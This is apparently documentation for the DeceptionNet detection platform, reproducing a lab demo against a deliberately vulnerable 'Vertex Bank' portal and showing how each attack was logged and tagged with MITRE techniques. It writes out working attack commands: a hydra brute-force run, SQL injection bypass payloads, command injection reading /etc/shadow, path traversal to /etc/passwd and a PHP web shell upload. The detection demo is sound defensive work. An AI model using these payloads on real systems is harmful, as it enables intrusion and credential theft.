# DeceptionNet — Attack Lab Demo Documentation

> **What this document covers:** every attack that was performed against the
> `attack-target` lab (the "Vertex Bank Employee Portal", a deliberately
> vulnerable web app), reproduced **step by step**, with the MITRE ATT&CK
> technique DeceptionNet tagged each one with and what it looked like on the
> dashboard.

**Target:** `http://localhost:9090` (the `attack-target` container)
**Dashboard:** `http://localhost:3000`
**Attacker:** the `attacker` container (`172.21.0.3`)

All 14 events below were trapped in **real time** — each one flowed
`attack-target → log-forwarder → core-api → MITRE rule engine → dashboard`.

---

## 1. Demo run summary

A single run of `hack-demo.sh` produced **14 trapped sessions** against the lab:

| Stage | Technique | Sessions | Severity |
|-------|-----------|----------|----------|
| 1. Brute force (hydra) | T1110 | 10 | 0.5 each |
| 2. SQL injection login bypass | T1078 | 3 | 1.0 each |
| 3. Post-compromise escalation chain | T1003.008 / T1048.003 / T1505.003 / T1078 | 1 | **14.0** |

The post-compromise chain is the "real" attack — one attacker who got in and kept
going, unified into a **single high-severity session** via cookie pinning.

---

## 2. Stage 1 — Brute Force (T1110.001)

### What happened
Hydra sprayed the login endpoint with common passwords for the `admin` account.
Every wrong guess was logged as its own session because failed logins are **not**
cookie-pinned — each guess looks like an independent authentication attempt, which
is exactly how brute force should be detected.

### Step-by-step (how it's done)

1. Prepare a wordlist. We used `attacker/scripts/mini-pass.txt`:
   ```
   password
   root
   admin
   123456
   admin123
   Passw0rd
   s3cr3t
   welcome
   toor
   letmein
   s3cr3t!
   ```
2. Copy the script + wordlist into the attacker container:
   ```bash
   docker cp attacker/scripts/hydra-attack.sh deciptionnet-attacker-1:/opt/attack/scripts/
   docker cp attacker/scripts/mini-pass.txt deciptionnet-attacker-1:/opt/attack/scripts/
   ```
3. Run hydra against the login form. **Key syntax notes:**
   - the target host is a **separate positional argument** (not embedded in the form string)
   - `-s 9090` is required because hydra defaults to port 80
   - the failure marker `Invalid credentials` is what hydra detects as a failed login
   ```bash
   docker compose exec attacker bash /opt/attack/scripts/hydra-attack.sh
   ```
   which runs:
   ```bash
   hydra -l admin -P "$PASSLIST" "$HOST" http-post-form \
     "/login:username=^USER^&password=^PASS^:Invalid credentials" -s "$PORT" -t 4
   ```

### What was observed
10 `login_failed` events, one per password tried:
```
Failed login on /login: admin/password
Failed login on /login: admin/root
Failed login on /login: admin/admin
Failed login on /login: admin/123456
Failed login on /login: admin/admin123
Failed login on /login: admin/Passw0rd
Failed login on /login: admin/s3cr3t
Failed login on /login: admin/welcome
Failed login on /login: admin/toor
Failed login on /login: admin/letmein
```
**MITRE tag:** `T1110 - Brute Force` (weight 0.5)
**Dashboard:** 10 sessions, severity 0.5 each.

> The `s3cr3t` guess came close — the real password is `s3cr3t!` (note the `!`).
> Hydra eventually cracks it in Stage 3.

---

## 3. Stage 2 — SQL Injection Login Bypass (T1078)

### What happened
The login endpoint is vulnerable to SQL injection. The attacker submitted SQLi
payloads that change the query logic so authentication always succeeds — the app
logged them in as `admin` **without a password**.

### Step-by-step (how it's done)

Two payloads were sent as the username with any password:

```bash
# Payload 1 — inline comment closes the WHERE clause
curl -s -X POST "$BASE/login" \
  --data-urlencode "username=admin'--" \
  --data-urlencode "password=x"

# Payload 2 — OR 1=1 makes the WHERE clause always true
curl -s -X POST "$BASE/login" \
  --data-urlencode "username=' OR 1=1 --" \
  --data-urlencode "password=x"
```

Each creates a **separate session** (the SQLi login bypass doesn't get cookie-pinned
in the demo).

### What was observed
2 `login` events flagged as SQL injection:
```
Successful login on /login: admin'-- (SQL injection bypass) SQLi payload: admin'--
Successful login on /login: ' OR 1=1 -- (SQL injection bypass) SQLi payload: ' OR 1=1 --
```
**MITRE tag:** `T1078 - Valid Accounts` (weight 1.0)
**Dashboard:** 2 sessions, severity 1.0 each.

---

## 4. Stage 3 — Post-Compromise Escalation Chain (severity 14.0)

### What happened
This is the realistic "attacker got in and kept going" scenario. The attacker:
1. Logged in with the **cracked** credentials (`admin` / `s3cr3t!`)
2. Ran **command injection** to read `/etc/shadow`
3. Ran **path traversal** to read `/etc/passwd`
4. Uploaded a **web shell** (`shell.php`)

Because the login **pins a session cookie**, all four steps were correlated into
**one** session instead of four fragments — exactly what a SOC analyst wants.

### Step-by-step (how it's done)

```bash
# 1. Login with cracked creds — this pins the Flask session cookie to a jar
curl -s -c /tmp/session.cookies -X POST "$BASE/login" \
  -d "username=admin&password=s3cr3t!"

# 2. Command injection on /ping — the host param is piped into a shell
curl -s -b /tmp/session.cookies -X POST "$BASE/ping" \
  --data-urlencode "host=127.0.0.1; id; cat /etc/shadow"

# 3. Path traversal on /read — ../ climbs out of the allowed directory
curl -s -b /tmp/session.cookies "$BASE/read?file=../../../../etc/passwd"

# 4. Web shell upload on /upload — a PHP file lands on the server
echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
curl -s -b /tmp/session.cookies -F "file=@/tmp/shell.php" "$BASE/upload"
```

> **The `-c`/`-b` cookie jar is the key.** Every request reuses the session cookie
> the login set, so the forwarder joins them into one tracked attack session.

### What was observed (session timeline)
```
login        Successful login on /login: admin
command      Command injection via /ping: ping -c 1 127.0.0.1; id; cat /etc/shadow
command      File read via /read: /etc/passwd
file_upload  File uploaded to /upload: shell.php (29 bytes)
```

### MITRE techniques on this session
| Technique | Description | Weight |
|-----------|-------------|--------|
| **T1003.008** | OS Credential Dumping: /etc/passwd and /etc/shadow | 5.0 |
| **T1048.003** | Exfiltration Over Alternative Protocol | 3.0 |
| **T1505.003** | Web Shell | 1.0 |
| **T1078** | Valid Accounts | 1.0 |
| ... plus others | (web portal capture, timestomp, system discovery, etc.) | 1.0 each |

**Total severity: 14.0** — the highest-risk session in the demo.

---

## 5. Full event ledger (all 14 sessions)

| Session | Severity | Events |
|---------|----------|--------|
| `web-...-5269b097` | **14.0** | login(admin) → cmd-injection(/ping) → LFI(/etc/passwd) → upload(shell.php) |
| `web-...-1662263a` | 1.0 | login(admin) |
| `web-...-dc6f31e2` | 1.0 | login(admin'--) SQLi bypass |
| `web-...-56a0d841` | 1.0 | login(' OR 1=1 --) SQLi bypass |
| `web-...-226ed35c` | 0.5 | login_failed admin/password |
| `web-...-68bd1ac0` | 0.5 | login_failed admin/root |
| `web-...-1776b72f` | 0.5 | login_failed admin/admin |
| `web-...-0a958b32` | 0.5 | login_failed admin/123456 |
| `web-...-c251b8cc` | 0.5 | login_failed admin/admin123 |
| `web-...-e1dec21f` | 0.5 | login_failed admin/Passw0rd |
| `web-...-efd811c5` | 0.5 | login_failed admin/s3cr3t |
| `web-...-96b996ba` | 0.5 | login_failed admin/welcome |
| `web-...-f511dfe8` | 0.5 | login_failed admin/toor |
| `web-...-717318d1` | 0.5 | login_failed admin/letmein |

---

## 6. How to reproduce the whole demo

```powershell
# 1. (optional) wipe previous attack data, keeping user accounts
docker compose exec -T core-api python -c "from clean_db import wipe_attack_data; wipe_attack_data()"

# 2. copy scripts into the attacker container (only needed once)
docker cp attacker/scripts/hack-demo.sh deciptionnet-attacker-1:/opt/attack/scripts/
docker cp attacker/scripts/mini-pass.txt deciptionnet-attacker-1:/opt/attack/scripts/

# 3. run the full 3-stage demo
docker compose exec attacker bash /opt/attack/scripts/hack-demo.sh

# 4. watch the dashboard live at http://localhost:3000
```

The demo script `attacker/scripts/hack-demo.sh` runs all three stages back-to-back.

---

## 7. MITRE ATT&CK techniques exercised

| Technique | Name | Stage |
|-----------|------|-------|
| T1110.001 | Brute Force: Password Guessing | 1 |
| T1078 | Valid Accounts | 2, 3 |
| T1003.008 | OS Credential Dumping: /etc/passwd & /etc/shadow | 3 |
| T1048.003 | Exfiltration Over Alternative Protocol | 3 |
| T1505.003 | Web Shell | 3 |
| T1033 | System Owner/User Discovery | 3 |
| T1056.003 | Input Capture: Web Portal Capture | 3 |

---

## 8. Why this matters

- **Every attack was caught live** — brute force, SQLi, command injection, path
  traversal, and file upload all triggered the MITRE rule engine.
- **Session correlation works** — cookie pinning turned a 4-step post-compromise
  chain into one high-severity (14.0) session a SOC analyst would act on.
- **The pipeline is real** — events went from the vulnerable app → log forwarder →
  core-api → MITRE mapping → WebSocket push to the dashboard, all in real time.

---

*Generated for the DeceptionNet attack-lab demo. All attacks were run against the
deliberately-vulnerable `attack-target` container inside an isolated Docker lab
network — nothing was aimed at a real system.*
